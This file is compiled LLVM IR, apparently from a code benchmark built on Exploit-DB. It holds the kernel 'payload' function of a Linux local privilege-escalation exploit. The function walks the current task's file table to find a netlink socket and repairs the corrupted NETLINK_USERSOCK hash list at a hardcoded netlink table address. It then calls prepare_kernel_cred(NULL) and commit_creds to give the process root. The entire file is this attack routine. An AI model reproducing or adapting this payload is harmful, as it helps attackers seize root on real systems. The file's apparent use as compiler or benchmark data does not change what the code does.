; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_payload.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_payload.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_8__ = type { i32 }
%struct.task_struct = type { %struct.TYPE_7__* }
%struct.TYPE_7__ = type { %struct.TYPE_6__* }
%struct.TYPE_6__ = type { %struct.TYPE_5__** }
%struct.TYPE_5__ = type { %struct.socket* }
%struct.socket = type { i32* }
%struct.netlink_table = type { %struct.nl_pid_hash }
%struct.nl_pid_hash = type { i32 }
%struct.hlist_head = type { %struct.hlist_node* }
%struct.hlist_node = type { %struct.hlist_node**, %struct.hlist_node* }

@restored_rsp = common dso_local global i32 0, align 4
@unblock_fd = common dso_local global i64 0, align 8
@NL_TABLE_ADDR = common dso_local global i64 0, align 8
@NETLINK_USERSOCK = common dso_local global i64 0, align 8
@g_target = common dso_local global %struct.TYPE_8__ zeroinitializer, align 4
@KMALLOC_TARGET = common dso_local global i64 0, align 8
@llvm.used = appending global [1 x i8*] [i8* bitcast (void ()* @payload to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @payload() #0 {
  %1 = alloca %struct.task_struct*, align 8
  %2 = alloca %struct.socket*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.netlink_table*, align 8
  %5 = alloca %struct.nl_pid_hash*, align 8
  %6 = alloca %struct.hlist_head*, align 8
  %7 = alloca %struct.hlist_node*, align 8
  %8 = alloca %struct.hlist_node**, align 8
  %9 = load i32, i32* @restored_rsp, align 4
  %10 = call %struct.task_struct* @get_current(i32 %9)
  store %struct.task_struct* %10, %struct.task_struct** %1, align 8
  %11 = load %struct.task_struct*, %struct.task_struct** %1, align 8
  %12 = getelementptr inbounds %struct.task_struct, %struct.task_struct* %11, i32 0, i32 0
  %13 = load %struct.TYPE_7__*, %struct.TYPE_7__** %12, align 8
  %14 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %13, i32 0, i32 0
  %15 = load %struct.TYPE_6__*, %struct.TYPE_6__** %14, align 8
  %16 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %15, i32 0, i32 0
  %17 = load %struct.TYPE_5__**, %struct.TYPE_5__*** %16, align 8
  %18 = load i64, i64* @unblock_fd, align 8
  %19 = getelementptr inbounds %struct.TYPE_5__*, %struct.TYPE_5__** %17, i64 %18
  %20 = load %struct.TYPE_5__*, %struct.TYPE_5__** %19, align 8
  %21 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %20, i32 0, i32 0
  %22 = load %struct.socket*, %struct.socket** %21, align 8
  store %struct.socket* %22, %struct.socket** %2, align 8
  %23 = load %struct.socket*, %struct.socket** %2, align 8
  %24 = getelementptr inbounds %struct.socket, %struct.socket* %23, i32 0, i32 0
  %25 = load i32*, i32** %24, align 8
  %26 = bitcast i32* %25 to i8*
  store i8* %26, i8** %3, align 8
  %27 = load %struct.socket*, %struct.socket** %2, align 8
  %28 = getelementptr inbounds %struct.socket, %struct.socket* %27, i32 0, i32 0
  store i32* null, i32** %28, align 8
  %29 = call i32 (...) @netlink_table_grab()
  %30 = load i64, i64* @NL_TABLE_ADDR, align 8
  %31 = inttoptr i64 %30 to %struct.netlink_table**
  %32 = load %struct.netlink_table*, %struct.netlink_table** %31, align 8
  store %struct.netlink_table* %32, %struct.netlink_table** %4, align 8
  %33 = load %struct.netlink_table*, %struct.netlink_table** %4, align 8
  %34 = load i64, i64* @NETLINK_USERSOCK, align 8
  %35 = getelementptr inbounds %struct.netlink_table, %struct.netlink_table* %33, i64 %34
  %36 = getelementptr inbounds %struct.netlink_table, %struct.netlink_table* %35, i32 0, i32 0
  store %struct.nl_pid_hash* %36, %struct.nl_pid_hash** %5, align 8
  %37 = load %struct.nl_pid_hash*, %struct.nl_pid_hash** %5, align 8
  %38 = load i32, i32* getelementptr inbounds (%struct.TYPE_8__, %struct.TYPE_8__* @g_target, i32 0, i32 0), align 4
  %39 = call %struct.hlist_head* @nl_pid_hashfn(%struct.nl_pid_hash* %37, i32 %38)
  store %struct.hlist_head* %39, %struct.hlist_head** %6, align 8
  %40 = load %struct.hlist_head*, %struct.hlist_head** %6, align 8
  %41 = getelementptr inbounds %struct.hlist_head, %struct.hlist_head* %40, i32 0, i32 0
  store %struct.hlist_node** %41, %struct.hlist_node*** %8, align 8
  %42 = load %struct.hlist_head*, %struct.hlist_head** %6, align 8
  %43 = getelementptr inbounds %struct.hlist_head, %struct.hlist_head* %42, i32 0, i32 0
  %44 = load %struct.hlist_node*, %struct.hlist_node** %43, align 8
  store %struct.hlist_node* %44, %struct.hlist_node** %7, align 8
  br label %45

45:                                               ; preds = %89, %0
  %46 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %47 = icmp ne %struct.hlist_node* %46, null
  br i1 %47, label %48, label %95

48:                                               ; preds = %45
  %49 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %50 = load i8*, i8** %3, align 8
  %51 = bitcast i8* %50 to %struct.hlist_node*
  %52 = icmp eq %struct.hlist_node* %49, %51
  br i1 %52, label %53, label %88

53:                                               ; preds = %48
  %54 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %55 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %54, i32 0, i32 1
  %56 = load %struct.hlist_node*, %struct.hlist_node** %55, align 8
  %57 = load i64, i64* @KMALLOC_TARGET, align 8
  %58 = inttoptr i64 %57 to %struct.hlist_node*
  %59 = icmp eq %struct.hlist_node* %56, %58
  br i1 %59, label %60, label %63

60:                                               ; preds = %53
  %61 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %62 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %61, i32 0, i32 1
  store %struct.hlist_node* null, %struct.hlist_node** %62, align 8
  br label %63

63:                                               ; preds = %60, %53
  %64 = load %struct.hlist_node**, %struct.hlist_node*** %8, align 8
  %65 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %66 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %65, i32 0, i32 0
  store %struct.hlist_node** %64, %struct.hlist_node*** %66, align 8
  %67 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %68 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %67, i32 0, i32 1
  %69 = load %struct.hlist_node*, %struct.hlist_node** %68, align 8
  %70 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %71 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %70, i32 0, i32 0
  %72 = load %struct.hlist_node**, %struct.hlist_node*** %71, align 8
  store %struct.hlist_node* %69, %struct.hlist_node** %72, align 8
  %73 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %74 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %73, i32 0, i32 1
  %75 = load %struct.hlist_node*, %struct.hlist_node** %74, align 8
  %76 = icmp ne %struct.hlist_node* %75, null
  br i1 %76, label %77, label %83

77:                                               ; preds = %63
  %78 = load %struct.hlist_node**, %struct.hlist_node*** %8, align 8
  %79 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %80 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %79, i32 0, i32 1
  %81 = load %struct.hlist_node*, %struct.hlist_node** %80, align 8
  %82 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %81, i32 0, i32 0
  store %struct.hlist_node** %78, %struct.hlist_node*** %82, align 8
  br label %83

83:                                               ; preds = %77, %63
  %84 = load %struct.nl_pid_hash*, %struct.nl_pid_hash** %5, align 8
  %85 = getelementptr inbounds %struct.nl_pid_hash, %struct.nl_pid_hash* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = add nsw i32 %86, -1
  store i32 %87, i32* %85, align 4
  br label %95

88:                                               ; preds = %48
  br label %89

89:                                               ; preds = %88
  %90 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %91 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %90, i32 0, i32 1
  store %struct.hlist_node** %91, %struct.hlist_node*** %8, align 8
  %92 = load %struct.hlist_node*, %struct.hlist_node** %7, align 8
  %93 = getelementptr inbounds %struct.hlist_node, %struct.hlist_node* %92, i32 0, i32 1
  %94 = load %struct.hlist_node*, %struct.hlist_node** %93, align 8
  store %struct.hlist_node* %94, %struct.hlist_node** %7, align 8
  br label %45

95:                                               ; preds = %83, %45
  %96 = call i32 (...) @netlink_table_ungrab()
  %97 = call i32 @prepare_kernel_cred(i32* null)
  %98 = call i32 @commit_creds(i32 %97)
  ret void
}

declare dso_local %struct.task_struct* @get_current(i32) #1

declare dso_local i32 @netlink_table_grab(...) #1

declare dso_local %struct.hlist_head* @nl_pid_hashfn(%struct.nl_pid_hash*, i32) #1

declare dso_local i32 @netlink_table_ungrab(...) #1

declare dso_local i32 @commit_creds(i32) #1

declare dso_local i32 @prepare_kernel_cred(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
